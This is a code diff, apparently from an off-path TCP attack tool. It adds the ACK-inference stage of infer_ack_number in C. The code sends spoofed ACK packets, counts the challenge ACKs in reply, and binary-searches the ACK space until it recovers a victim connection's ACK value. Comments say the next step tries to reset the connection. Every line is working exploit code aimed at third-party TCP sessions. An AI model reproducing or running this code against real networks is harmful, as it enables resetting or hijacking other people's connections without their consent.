@@ -1278,14 +1278,9 @@ int infer_ack_number(void)
 	volatile conn_t *spoof = &(g_ctx.spoof);
 	int step = -1;
 	/* printing status */
-	u_long pr_start, pr_end, pkts_sent;
-#if 0
-	/* chunk-based search vars */
-	chunk_t *sched = NULL;
-	int nchunks = 0, ci = 0;
+	u_long pr_start, pr_end;
 	/* binary search vars */
 	u_long bs_start = 0, bs_end = 0, bs_mid = 0;
-#endif
 	u_long g_acks[4] = { 0, 0x40000000, 0x80000000, 0xc0000000 };
 	int g_chacks[4] = { 0 };
 	int ai = 0;
@@ -1297,23 +1292,41 @@ int infer_ack_number(void)
 		if (step == -1) {
 			/* step 1 doesn't require any initialization as it's hardcoded in g_acks */
 			step = 0;
+
+			/* step 2 init happens after the first four divisions are tested */
 		}
 
 		/* send packets depending on the step we're in */
 		if (step == 0) {
 			/* send 0G, 1G, 2G, and 3G data packets */
-			pkts_sent = 0;
+
+			/* set these for printing status */
 			pr_start = g_acks[ai];
+			pr_end = (g_acks[ai] + g_acks[1]) & 0xffffffff;
+
 			spoof->ack = g_acks[ai];
 			if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
 				return 0;
-			pkts_sent++;
+		} else if (step == 1) {
+			/* select a new mid */
+			bs_mid = (bs_start + bs_end) / 2;
+
+			/* set these for printing status */
+			pr_start = bs_mid;
+			pr_end = bs_end;
+
+			/* send em! */
+			spoof->ack = bs_mid;
+			if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
+				return 0;
+
+			/* we'll do maintenance after we check the results */
 		}
 
 #ifdef DEBUG_ACK_INFER_SPOOF_SEND
 		gettimeofday(&now, NULL);
 		timersub(&now, &round_start, &diff);
-		printf("[*] ack-infer: spoofed %lu data packets in %lu %lu\n", pkts_sent,
+		printf("[*] ack-infer: spoofed one data packet in %lu %lu\n",
 				diff.tv_sec, diff.tv_usec);
 #endif
 
@@ -1324,20 +1337,78 @@ int infer_ack_number(void)
 		/* get the number of challenge ACKs within this second */
 		wait_until("ack-infer recv", &round_start, 1, 0);
 
-		printf("[*] ack-infer: guessed acks [%08lx - %08lx): %lu packets, %3d challenge ACKs\n",
-				pr_start, pr_end, pkts_sent, g_chack_cnt);
+		if (step == 0)
+			printf("[*] ack-infer: guessed acks [%08lx - %08lx): %3d challenge ACKs\n",
+					pr_start, pr_end, g_chack_cnt);
+		else if (step == 1)
+			printf("[*] ack-infer: guessed acks [%08lx - %08lx): %lu possibilities, %3d challenge ACKs\n",
+					pr_start, pr_end, (pr_end - pr_start), g_chack_cnt);
 
 		/* adjust the search based on the results and mode */
 		if (step == 0) {
 			/* just record the number of challenge ACKs received */
 			g_chacks[ai] = g_chack_cnt;
-
 			ai++;
 
 			/* if we finished, proceed to the next step */
-			if (ai == sizeof(g_acks) / sizeof(g_acks[0]))
-				/* FAIL FOR NOW */
-				return 0;
+			if (ai == sizeof(g_acks) / sizeof(g_acks[0])) {
+				int i;
+				u_long ack_start = 31337;
+
+				/* we'll focus on the first G followed by a 99 chacks */
+				for (i = 1; i < 4; i++) {
+					if (g_chacks[i-1] == 100 && g_chacks[i] == 99) {
+						ack_start = g_acks[i-1];
+						break;
+					}
+				}
+				/* if this is the pathological case, work backwards */
+				if (ack_start == 31337 && g_chacks[0] == 99) {
+					for (i = 3; i > 0; i--) {
+						if (g_chacks[i] == 100) {
+							ack_start = g_acks[i];
+						}
+					}
+				}
+				if (ack_start == 31337) {
+					fprintf(stderr, "[!] No left-most ACK window?!\n");
+					return 0;
+				}
+
+				/* divide and conquer! */
+				bs_start = ack_start;
+				bs_end = ack_start + g_acks[1];
+				printf("[*] Binary searching %lu - %lu (%lu possibilities)\n",
+						bs_start, bs_end, g_acks[1]);
+				step = 1;
+			}
+		} else if (step == 1) {
+			/* figure out which chunk exactly! */
+			if (g_chack_cnt == 99) {
+				if (bs_start >= bs_end) {
+					/* FAIL! */
+					printf("[!] Exhausted ack window binary search...\n");
+					/* go back to the beginning of the schedule?? */
+					return 0;
+				} else {
+					/* adjust range */
+					bs_end = bs_mid;
+				}
+			} else if (g_chack_cnt == 100) {
+				/* if our window is 1, we win! */
+				if (bs_mid == bs_end - 1) {
+					/* continue with step2 -- try to reset the connection */
+					bs_mid -= g_acks[2] - 1;
+					printf("[*] Determined approx. ACK value: %lu\n", bs_mid);
+					spoof->ack = bs_mid;
+					return 1;
+				}
+				else
+					/* adjust range */
+					bs_start = bs_mid;
+			} else {
+				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
+			}
 		}
 
 #if 0
